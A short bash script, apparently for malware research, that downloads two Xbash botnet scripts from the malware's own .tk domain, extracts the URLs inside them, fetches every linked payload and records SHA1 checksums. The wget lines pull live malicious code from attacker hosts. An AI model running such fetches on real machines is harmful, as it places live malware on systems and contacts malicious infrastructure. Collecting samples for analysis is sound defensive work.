#!/bin/bash
#Extract urls
#hfjimenez@utp.edu.co
#taken from https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/

#Base files from paloaltonetworks post
wget 3g2upl4pq6kufc4m.tk/lowerv2.sh
wget 3g2upl4pq6kufc4m.tk/r88.sh

#Extract url
grep -oP "http://\K[^']+" r88.sh lowerv2.sh|awk '{print $1}'|cut -d ':' -f2|uniq>urls.txt
#Get all files
wget -i urls.txt

for i in `ls`; do echo " `sha1sum ${i}`">>checksum;done

